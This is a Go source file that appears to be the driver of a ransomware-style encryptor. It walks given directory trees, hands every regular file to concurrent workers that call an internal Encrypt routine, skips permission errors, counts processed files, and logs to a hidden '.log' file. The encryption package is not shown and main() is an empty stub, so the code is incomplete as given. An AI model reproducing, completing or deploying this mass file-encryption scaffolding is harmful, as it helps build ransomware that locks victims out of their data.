package main

import (
	"bufio"
	"bytes"
	core "golang/internal/internalEncryptor"
	"io"
	"io/ioutil"
	"log"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/karrick/godirwalk"
)

// setup log
var file *os.File

// setup counters
const maxCount = 10

var totalFiles int
var procFiles int
var unprocFiles int

// setup channels/waitgroup
var wg, wg2 sync.WaitGroup
var tasks chan string
var results chan bool

type Mem struct {
	Total      uint64
	Used       uint64
	Free       uint64
	ActualFree uint64
	ActualUsed uint64
}

const MaxUint64 = ^uint64(0)

var system struct {
	ticks uint64
	btime uint64
}

var Procd string

func (self *Mem) Get() error {
	var available uint64 = MaxUint64
	var buffers, cached uint64
	table := map[string]*uint64{
		"MemTotal":     &self.Total,
		"MemFree":      &self.Free,
		"MemAvailable": &available,
		"Buffers":      &buffers,
		"Cached":       &cached,
	}

	if err := parseMeminfo(table); err != nil {
		return err
	}

	if available == MaxUint64 {
		self.ActualFree = self.Free + buffers + cached
	} else {
		self.ActualFree = available
	}

	self.Used = self.Total - self.Free
	self.ActualUsed = self.Total - self.ActualFree

	return nil
}

func parseMeminfo(table map[string]*uint64) error {
	return readFile(Procd+"/meminfo", func(line string) bool {
		fields := strings.Split(line, ":")

		if ptr := table[fields[0]]; ptr != nil {
			num := strings.TrimLeft(fields[1], " ")
			val, err := strtoull(strings.Fields(num)[0])
			if err == nil {
				*ptr = val * 1024
			}
		}

		return true
	})
}

func readFile(file string, handler func(string) bool) error {
	contents, err := ioutil.ReadFile(file)
	if err != nil {
		return err
	}

	reader := bufio.NewReader(bytes.NewBuffer(contents))

	for {
		line, _, err := reader.ReadLine()
		if err == io.EOF {
			break
		}
		if !handler(string(line)) {
			break
		}
	}

	return nil
}

func strtoull(val string) (uint64, error) {
	return strconv.ParseUint(val, 10, 64)
}

func init() {

	system.ticks = 100 // C.sysconf(C._SC_CLK_TCK)
	Procd = "/proc"
	procFiles = 0
	unprocFiles = 0
	file, err := os.OpenFile(".log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0655)
	if err != nil {
		log.Fatal(err)
	}

	log.SetOutput(file)
	log.Printf("[*] Started logging\n")
}

func worker(wg *sync.WaitGroup, tasks <-chan string, results chan<- bool, id int) {

	for filepath := range tasks {
		time.Sleep(time.Millisecond)
		results <- core.Encrypt(filepath, file)
	}
	wg.Done()

}

func setup(paths []string) {

	// read paths
	totalFiles = 0 // setup counter
	for i := 0; i < len(paths); i++ {
		err := godirwalk.Walk(paths[i], &godirwalk.Options{
			Callback: func(osPathname string, de *godirwalk.Dirent) error {
				if de.IsRegular() {
					totalFiles = totalFiles + 1 // add to counter
					tasks <- osPathname         // pass to tasks channel for treatment
				}
				return nil
			},
			Unsorted: true, // no sorting for better performance
			// on error skip (permission error)
			ErrorCallback: func(osPathname string, err error) godirwalk.ErrorAction {
				return godirwalk.SkipNode
			}})

		if err != nil {
			log.Println("[-] Error walking ", err)
		}
	}
	close(tasks)
}

func analyze(results <-chan bool) {

	for job := range results {
		if job {
			procFiles++
		} else {
			unprocFiles++
		}
	}
	wg2.Done()
}
func bToMb(b uint64) int {
	return int(b) / 1024 / 1024
}

func main() {

	return
}
